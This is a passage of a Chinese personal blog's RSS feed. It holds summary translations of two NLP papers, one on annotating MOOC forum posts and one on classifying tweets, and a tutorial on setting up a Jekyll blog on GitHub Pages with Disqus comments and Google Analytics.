        <link>https://wuyinan0126.github.io//2016/%E5%AD%A6%E7%94%9F%E5%AF%B9%E8%AF%9D%E8%A1%8C%E4%B8%BA%E7%9A%84%E9%9D%9E%E7%9B%91%E7%9D%A3%E5%88%86%E7%B1%BB/</link>
        <guid isPermaLink="true">https://wuyinan0126.github.io//2016/%E5%AD%A6%E7%94%9F%E5%AF%B9%E8%AF%9D%E8%A1%8C%E4%B8%BA%E7%9A%84%E9%9D%9E%E7%9B%91%E7%9D%A3%E5%88%86%E7%B1%BB/</guid>
        
        <category>NLP</category>
        
        <category>摘译</category>
        
        <category>机器学习</category>
        
        <category>聚类</category>
        
        <category>MOOC</category>
        
        
        <category>NLP</category>
        
        <category>摘译</category>
        
        <category>机器学习</category>
        
        <category>聚类</category>
        
        <category>MOOC</category>
        
      </item>
    
      <item>
        <title>&lt;font color=&#39;orange&#39;&gt;[摘译]&lt;/font&gt; MOOC论坛帖子的半自动标注</title>
        <description>&lt;p&gt;&lt;em&gt;目前对于理解MOOC论坛帖子潜在因素的研究较少，其中一个阻碍研究的原因就是需要对大量的论坛帖子进行人工标注。因此，文章使用机器学习技术，使用少量的标注来推断整个论坛。这些标注不仅仅使得MOOC的管理者总结论坛的状态，而且能过让研究者更深层次地认识在学习的进程中MOOC论坛的作用&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;文章&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://infoscience.epfl.ch/record/210990/files/paper.pdf&quot;&gt;Semi-automatic annotation of MOOC forum posts&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;section-1&quot;&gt;研究现状&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;非监督学习可以使用强加的方法将帖子聚类，每个类别的语义并不是由算法决定，因此经常难以翻译语义。相反的，监督学习基于ground truth——一个标注好的帖子集合，其中每个帖子的语义已经被预先定义。这允许我们将已知的语义扩展到大的集合中。在文章中，我们使用半自动标注方法进行监督学习。&lt;/p&gt;

&lt;h2 id=&quot;section-2&quot;&gt;帖子分类&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;文章使用&lt;a href=&quot;http://www.aclweb.org/anthology/W14-2715&quot;&gt;Sridhar的分类方法&lt;/a&gt;，并根据MOOC的特点进行修改，得出以下特征：&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;类别&lt;/th&gt;
      &lt;th&gt;描述&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;问题&lt;/td&gt;
      &lt;td&gt;关于课程的信息请求&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;回答&lt;/td&gt;
      &lt;td&gt;尝试回答帖子中的问题&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;请求说明&lt;/td&gt;
      &lt;td&gt;请求更多关于答案的细节或说明&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;正面反馈&lt;/td&gt;
      &lt;td&gt;学生的正面反馈（例如感激等）&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;负面反馈&lt;/td&gt;
      &lt;td&gt;学生的负面反馈（例如答案不正确、有错误等）&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;与学习无关&lt;/td&gt;
      &lt;td&gt;任何形式的与学习无关的内容&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;
因为在我们研究中自动标注的一个目标是发现没有被正确处理的那些重要的帖子，因为我们选择评价帖子内容与课程的关系的重要性。我们引入两个指标：相关性和可理解性。这些指标是主观的，可以在其它特定的应用中被修改。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;相关性 描述一个帖子内容和课程内容的相关度，分为5个级别：
    &lt;ol&gt;
      &lt;li&gt;不相关 学生发帖内容没有意图与课程内容接近&lt;/li&gt;
      &lt;li&gt;轻微不相关 关系非常的表面，主要内容仍是不相关的&lt;/li&gt;
      &lt;li&gt;中性 含有与主题相关的内容，但是模糊不清楚&lt;/li&gt;
      &lt;li&gt;相关 含有理解或解决问题的明确意图&lt;/li&gt;
      &lt;li&gt;高度相关 学生论证了自己的理解和他对解决问题的尝试&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;相关性只作用于三个类别：问题、回答和请求说明。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;可理解性 描述一个帖子被可读的难易程度，分为三个级别：
    &lt;ol&gt;
      &lt;li&gt;令人误解 不清楚或令人误解的语言&lt;/li&gt;
      &lt;li&gt;中性 清楚并且准确的描述&lt;/li&gt;
      &lt;li&gt;高度可理解性 学生陈述了关于问题的所有必须的细节，或者他对于解决问题的尝试&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;section-3&quot;&gt;特征提取&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;我们的目标是通过少量的人工标注的集合预测变量。我们在帖子中提取如下的特征：&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;特征&lt;/th&gt;
      &lt;th&gt;描述&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;单词个数&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;相关的单词个数&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;相关词率&lt;/td&gt;
      &lt;td&gt;相关的单词个数/单词总个数&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;句子个数&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;拼写错误个数&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;语法错误个数&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;问号个数&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;索引&lt;/td&gt;
      &lt;td&gt;在一个Post Thread中的位置索引&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;标题中单词个数&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;标题中相关的单词个数&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;标题相关词率&lt;/td&gt;
      &lt;td&gt;标题中相关的单词个数/标题单词总个数&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;语法质量&lt;/td&gt;
      &lt;td&gt;语法正确性（1-10）&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;
其中，相关词语将来自从讲课幻灯片和帖子内容，人工地列举出出现最多的单词并提取出于课程相关的单词。语法质量、拼写错误数和语法错误数使用R语言的text mining tm包生成。&lt;/p&gt;

&lt;hr /&gt;

</description>
        <pubDate>Sun, 18 Sep 2016 08:00:00 +0800</pubDate>
        <link>https://wuyinan0126.github.io//2016/MOOC%E8%AE%BA%E5%9D%9B%E5%B8%96%E5%AD%90%E7%9A%84%E5%8D%8A%E8%87%AA%E5%8A%A8%E6%A0%87%E6%B3%A8/</link>
        <guid isPermaLink="true">https://wuyinan0126.github.io//2016/MOOC%E8%AE%BA%E5%9D%9B%E5%B8%96%E5%AD%90%E7%9A%84%E5%8D%8A%E8%87%AA%E5%8A%A8%E6%A0%87%E6%B3%A8/</guid>
        
        <category>摘译</category>
        
        <category>机器学习</category>
        
        <category>分类</category>
        
        <category>MOOC</category>
        
        
        <category>摘译</category>
        
        <category>机器学习</category>
        
        <category>分类</category>
        
        <category>MOOC</category>
        
      </item>
    
      <item>
        <title>&lt;font color=&#39;orange&#39;&gt;[摘译]&lt;/font&gt; 基于Tweet特征的短文本分类</title>
        <description>&lt;p&gt;&lt;em&gt;由于短文本不能提供足够多的文字，因此“Bag-Of-Words”方法具有局限性。文章提出一种使用小规模的、从作者profile和发布的文本内容中提取的domain-specific特征集合进行短文本分类，并允许用户根据自己的兴趣添加新的分类&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;文章&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://www.researchgate.net/profile/Hakan_Ferhatosmanoglu/publication/221300153_Short_text_classification_in_twitter_to_improve_information_filtering/links/55b2111608ae9289a084fccd.pdf&quot;&gt;Short text classification in twitter to improve information filtering&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;section-1&quot;&gt;论文摘要&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;由于短文本不能提供足够多的文字，因此“Bag-Of-Words”方法具有局限性。文章提出一种使用小规模的、从作者profile和发布的文本内容中提取的domain-specific特征集合进行短文本分类（文章针对Twitter），预先分为新闻（News）、事件（Events）、观点（Opinions）、交易或产品（Deals）和私人信息（Private Message）。&lt;/p&gt;

&lt;p&gt;由于短文本字数的限制，目前对于短文本分类的方法主要是根据文本的源信息在Wikipedia和WordNet上搜索额外的相关信息，以扩充短文本内容。然而这需要在线的查询，其时间花费使其不适合用于实时的应用。同时，这也提高了特征的数量，因此需要复杂的算法来减少冗余的特征，以避免出现维度诅咒（curse of dimensionality）。&lt;/p&gt;

&lt;p&gt;因此，最有效的可以提高分类准确率的方法就是用最小的特征集合来表示短文本。文章提出根据用户意图，将Tweet分为五类，并能涵盖大部分的Tweet话题。&lt;/p&gt;

&lt;p&gt;接下来，文章介绍如何让用户根据自己的兴趣添加新的分类。因为算法的准确度随着分类数量的增加而降低，因此用户需要添加新类别对应的特征。具体是，系统根据用户提供的sampled tweets生成新的特征。&lt;/p&gt;

&lt;h2 id=&quot;section-2&quot;&gt;文本的表示&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;最通用的表示文本的技术是Bag-Of-Words(BOW)模型。文本被分成一个一个的单词，每个单词代表一个特征，这个过程也被叫做”Tokenization”。在BOW模型中，单词出现的顺序是无关的。但由于特征向量过大，需要使用去除停用词（stop word removal）或词干提取（stemming）技术来降低维度。去除停用词指去除没有明显意义的词，例如a，an，the，if，for等；词干提取指提取单词的基本形态，例如ran、running、runs的基本形态都是run。一个通用的英文词干提取算法是“Porter’s Algorithm”。&lt;/p&gt;

&lt;p&gt;另外一种用于加权特征的方法是TF-IDF模型。TF是指一个单词的出现频率（Term Frequency），TF值越高，该词的特征权重越高。但是TF的不足在于，例如文章都是关于“Google Search Algorithm”，那么术语“Google”很大可能出现频繁，然而文章大重点不是关于Google公司而是它的搜索算法。因此，为了减少“Google”单词的影响，使用IDF（Inverse Document Frequency）。DF（Document Frequency）是指包含特定单词的文章数，DF值越高，该单词的特征越不重要。一个特征的IDF的公式如下：&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;IDF=log(\frac{N}{DF})&lt;/script&gt;

&lt;p&gt;其中，N是语料库中的文章数。最终，一个特征的TF-IDF表示如下：&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;TFIDF=TF*IDF&lt;/script&gt;

&lt;p&gt;在表示了文本后，可以使用多种分类算法进行分类。例如Naïve Bayes Classifier、Support Vector Models、Decision Trees、Voted Perception。&lt;/p&gt;

&lt;h2 id=&quot;section-3&quot;&gt;短文本分类的研究现状&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;传统使用BOW模型适用于大量的数据集，因为单词出现频率高且顺序无关，词频足以表示文章的语义。对于短文本，大量的工作是扩充文本使其成为一个长文本，例如使用搜索引擎，但是这需要单词不具有二义性。如”jaguar”和”car”是高度相关的，但搜索引擎可能会将它联系到动物”jaguar”。同时，在线搜索的时间花费不适合于实时应用。而使用Wikipedia数据库的snap shot虽然解决了耗时问题，但是容易过期。并且BOW模型中的单个单词可能不具有上下文语义，而需要多个单词才能表达。&lt;/p&gt;

&lt;p&gt;总而言之，现有的短文本分类技术框架如图所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2016-09-15-1.png&quot; alt=&quot;现有的短文本分类技术框架&quot; title=&quot;现有的短文本分类技术框架&quot; /&gt;&lt;/p&gt;

&lt;p&gt;现有的研究通过结合使用WordNet和Wikpedia来提高有效特征，通过解析短文本将其分类成segments, phrases and words，并从中寻找短语作为查询Wikipedia和WordNet的关键词。这需要NLP技术。&lt;/p&gt;

&lt;p&gt;同时，现有的研究中最大的挑战之一是维度诅咒。&lt;/p&gt;

&lt;h2 id=&quot;f8&quot;&gt;使用8F（8个特征）进行信息过滤&lt;/h2&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;section-4&quot;&gt;特征选择&lt;/h3&gt;

&lt;p&gt;由于使用词频作为特征不能很好的表示短文本，因此根据Tweet的特性，使用以下八个authorship information特征来表示Tweet文本：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Shortening of words and slangs (Binary)&lt;/li&gt;
  &lt;li&gt;ime-event information (Binary)&lt;/li&gt;
  &lt;li&gt;Opinions (Binary)&lt;/li&gt;
  &lt;li&gt;Emphasis on words (Binary)&lt;/li&gt;
  &lt;li&gt;Currency, statistical information (Binary)&lt;/li&gt;
  &lt;li&gt;Reference to another user at beginning of tweet (Binary)&lt;/li&gt;
  &lt;li&gt;Reference to another user within tweet (Binary)&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;section-5&quot;&gt;特征提取&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;新闻（News）：公共的Tweet通常与私人Tweet具有不同的动机。前者通常具有干净的格式，而后者的表达经常带有口头语、缩写和表情。&lt;/li&gt;
  &lt;li&gt;事件（Events）：如果我们定义事件为“在特定地点和时间发生的事情”，那么参与者、地点、时间信息可能意味着Tweet中含有事件。&lt;/li&gt;
  &lt;li&gt;观点（Opinions）：通过查找包含3000个与观点相关的单词的词典，也通过查找Tweet中大写字母、一个单词中的重复字母，例如veery，来进行筛选。&lt;/li&gt;
  &lt;li&gt;交易或产品（Deals）：通过查找货币、百分比符号等来进行筛选。&lt;/li&gt;
  &lt;li&gt;私人信息（Private Messages）：通过查找“@”+人名符号来进行筛选。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;当然，一个Tweet可能属于多个类别，因此可以设定一个阈值&lt;script type=&quot;math/tex&quot;&gt;\Theta&lt;/script&gt;，当一个Tweet被标记为某一类别的概率低于&lt;script type=&quot;math/tex&quot;&gt;\Theta&lt;/script&gt;时，将其同时标记为多个类别。&lt;/p&gt;

&lt;h2 id=&quot;section-6&quot;&gt;用户自定义类别和特征&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;用户不用指出新特征确切是什么，只需要通过提供sample tweets给系统学习新的特征来增加新特征。系统通过查找用户提供的sampled tweets中的共同词语、出现的URL、共同的特定字符或共同的作者来分析，当然也可能存在在sampled tweets中没有共同的特征的情况，因此采用如下的方法。&lt;/p&gt;

&lt;h3 id=&quot;key-term-identification&quot;&gt;Key Term Identification&lt;/h3&gt;

&lt;p&gt;为了明确中心主题，我们需要搜寻可以表示这个主题的词条（term）。将两条tweets作为输入。首先先对tweet进行预处理，包括去除停用词和opinionated words（？），同时去除特殊的字符。然后，考虑两条tweets中的每一对词语，并在搜索引擎中获得这两个词组成的短语的条数。这个方法可以发现两条tweets间相似的词语，条数越多，它们越有可能同时出现在一个文档中并且越有可能表示同一个主题。我们考虑条数top n（n通常为1～5）的词语对。并且通过使用WebJaccard co-efficient来减少false positives（被模型预测为正的负样本），则两个单词的相似度计算公式如下：&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
WebJaccard(P,Q)=\begin {cases}
0, &amp; H(P\ AND\ Q)\leq\theta \\\
H(P\ AND\ Q)/[H(P)+H(Q)-H(P\ AND\ Q)], &amp; H(P\ AND\ Q)\gt\theta
\end {cases} %]]&gt;&lt;/script&gt;

&lt;p&gt;其中，‘P’和‘Q’是独立查找的关键词，“P AND Q”是同时查找的关键词，H(P)是关键词‘P’的条数，&lt;script type=&quot;math/tex&quot;&gt;\theta&lt;/script&gt;是用户设置的阈值。&lt;/p&gt;

&lt;p&gt;然而，false positive不能被系统所确定，因此需要用户判断系统分析的主题是否正确。用户可以明确地去除无关的主题词，之后系统再重新运算。&lt;/p&gt;

&lt;h3 id=&quot;section-7&quot;&gt;计算相似词&lt;/h3&gt;

&lt;p&gt;在确定tweets的主题词后，我们进一步计算其它相似的可以表示该主题的词语。这是为了确保没有出现在sampled tweets中的主题词但能够表达该主题的词语也能被作为特征。通过查询Microsoft Word Thesaurus或WordNet。&lt;/p&gt;

&lt;p&gt;除了计算出相似的单词，也需要计算很有可能出现在主题中的相似词语，例如Coffee主题中可能出现chocolate, bar, espresso, kaffee, food, eating, wifi, coffeehouse starbucks等。通过使用Google Sets API。&lt;/p&gt;

&lt;p&gt;一旦新的特征被认为是正确的，我们更新训练数据以包括新的特征并重新训练分类器。流程如下图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2016-09-15-2.png&quot; alt=&quot;特征添加流程&quot; title=&quot;特征添加流程&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

</description>
        <pubDate>Thu, 15 Sep 2016 08:00:00 +0800</pubDate>
        <link>https://wuyinan0126.github.io//2016/%E5%9F%BA%E4%BA%8ETweet%E7%89%B9%E5%BE%81%E7%9A%84%E7%9F%AD%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB/</link>
        <guid isPermaLink="true">https://wuyinan0126.github.io//2016/%E5%9F%BA%E4%BA%8ETweet%E7%89%B9%E5%BE%81%E7%9A%84%E7%9F%AD%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB/</guid>
        
        <category>摘译</category>
        
        <category>机器学习</category>
        
        <category>分类</category>
        
        
        <category>摘译</category>
        
        <category>机器学习</category>
        
        <category>分类</category>
        
      </item>
    
      <item>
        <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; GitHub个人博客搭建</title>
        <description>&lt;p&gt;&lt;em&gt;使用Jekyll-Uno模版在GitHub上搭建个人博客，并添加评论和Google Analytics的功能。包括GitHub相关准备工作、本地开发环境的搭建和其它实用工具&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;github&quot;&gt;GitHub相关准备工作&lt;/h2&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;在自己的GitHub仓库中创建名为username.github.io的项目，例如wuyinan0126.github.io&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;将你的username.github.io项目（以下称根目录）git clone到本地&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; cd $MY_WORKSPACE
 git clone https://github.com/username/username.github.io.git
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;下载Jekyll-Uno模版并解压&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; wget https://github.com/joshgerdes/jekyll-uno/archive/master.zip
 unzip jekyll-uno-master.zip
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;将解压后的jekyll-uno-master目录中的所有文件复制进根目录&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; cp -r ./jekyll-uno-master/* ./username.github.io/
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;进入根目录，修改配置文件_config.yml，将url和baseurl修改为&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; cd username.github.io
 vi ./_config.yml
 -	url: &#39;https://username.github.io&#39;
 -	baseurl: &#39;/&#39;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在根目录，提交并上传更新&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; git add .
 git commit -a -m &quot;Initial Blog&quot;
 git push origin master
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;查看你的GitHub仓库中的username.github.io项目，确认代码上传成功。然后，访问http://username.github.io。Suprise！至此，我们已经将Jekyll-Uno模版展示在我们的个人博客上了！&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;jekyll-server&quot;&gt;使用Jekyll Server进行本地预览&lt;/h2&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;安装Ruby和RubyGems，并将Ruby源替换为Ruby淘宝镜像源&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; gem sources --remove https://rubygems.org/ 
 gem sources -a https://ruby.taobao.org/ 
 gem sources -l  
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在根目录，安装Jekyll Server&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; gem install bundler
 bundle install
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在根目录，启动Jekyll Server&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; bundle exec jekyll serve --watch
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在&lt;code class=&quot;highlighter-rouge&quot;&gt;http://localhost:4000/&lt;/code&gt;查看本地预览&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;sublime-2omnimarkuppreviewer&quot;&gt;使用Sublime 2和OmniMarkupPreviewer进行博文撰写&lt;/h2&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;安装Sublime 2，并在Package Control中输入Install Package，搜索并安装OmniMarkupPreviewer。重启Sublime 2&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;进入根目录下的_posts目录，这是用于存放博文的地方，新建一个相同命名格式的文件，例如2016-09-15-GitHub个人博客搭建.markdown，并使用&lt;a href=&quot;http://www.appinn.com/markdown/#autoescape&quot;&gt;markdown语法&lt;/a&gt;进行博文撰写&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在Sublime 2的Markdown标签页点击鼠标右键，选择Preview Current Markup in Browser。或者使用快捷键（OSX ⌘+⌥+O; Windows, Linux Ctrl+Alt+O）来实时预览&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;对根目录内容进行修改后，提交并上传更新&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; git add .
 git commit -a -m &quot;COMMENT&quot;
 git push origin master
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;section&quot;&gt;添加评论功能&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;注册&lt;a href=&quot;https://disqus.com/&quot;&gt;Disqus&lt;/a&gt;账户，点击“I want to install Disqus on my site”，并填写基本信息&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;选择平台。选择“install manually with Universal Code”，将获得的代码复制到根目录下的_includes/disqus.html中，Universal Code中需要修改的地方如下&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; var disqus_config = function () {
   this.page.url = &#39;{{ site.url }}{{ page.url }}&#39;; 
   this.page.identifier = &#39;{{ page.id }}&#39;; 
   this.page.title = &#39;{{ page.title }}&#39;;
 };
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;修改根目录下的_config.yml，取消注释&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; disqus_shortname: &#39;Disqus用户名&#39;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;google-analytics&quot;&gt;添加Google Analytics&lt;/h2&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;登录Google Analytics创建新网站，生成跟踪ID&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;修改根目录下的_config.yml，取消注释&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; google_analytics: &#39;跟踪ID&#39;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;section-1&quot;&gt;页面布局修改&lt;/h2&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;首页添加tag选项&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;修改根目录下_includes/header.html:&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &amp;lt;nav class=&quot;cover-navigation cover-navigation--primary&quot;&amp;gt;
  &amp;lt;ul class=&quot;navigation&quot;&amp;gt;
    &amp;lt;li class=&quot;navigation__item&quot;&amp;gt;&amp;lt;a href=&quot;{{ site.baseurl }}#blog&quot; title=&quot;link to {{ site.title }} blog&quot; class=&quot;blog-button&quot;&amp;gt;Blog&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
  &amp;lt;/ul&amp;gt;
  &amp;lt;/nav&amp;gt;

 +++
 &amp;lt;nav class=&quot;cover-navigation cover-navigation--primary&quot;&amp;gt;
 &amp;lt;ul class=&quot;navigation&quot;&amp;gt;
  &amp;lt;li class=&quot;navigation__item&quot;&amp;gt;&amp;lt;a href=&quot;{{ site.baseurl }}tags&quot; title=&quot;link to {{ site.title }} tags&quot; class=&quot;blog-button&quot;&amp;gt;Tags&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
 &amp;lt;/ul&amp;gt;
 &amp;lt;/nav&amp;gt;
 +++
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;修改根目录下_layouts/tags.html:&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;a href=&quot;{{ post.url }}&quot;&amp;gt;{{ post.title }}&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;博文页添加“上一篇”“下一篇”按钮&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;修改根目录下css/main.css，在最后添加:&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; .page_navigation {
   font-size: 14px;
   display: block;
   width: auto;
   overflow: hidden;
 }

 .page_navigation a {
   display: block;
   width: 50%;
   float: left;
   margin: 1em 0;
 }

 .page_navigation .next {
   text-align: right;
 }
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;修改根目录下_layouts/post.html，添加：&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;section class=&quot;post&quot;&amp;gt;
 {{ content }}
 +++
     &amp;lt;div class=&quot;page_navigation&quot;&amp;gt;
     {% if page.previous %}
       &amp;lt;a class=&quot;prev&quot; href=&quot;{{page.previous.url}}&quot;&amp;gt;&amp;amp;laquo; {{page.previous.title}}&amp;lt;/a&amp;gt;
     {% endif %}
     {% if page.next %}
       &amp;lt;a class=&quot;next&quot; href=&quot;{{page.next.url}}&quot;&amp;gt;{{page.next.title}} &amp;amp;raquo;&amp;lt;/a&amp;gt;
     {% endif %}
     &amp;lt;/div&amp;gt;
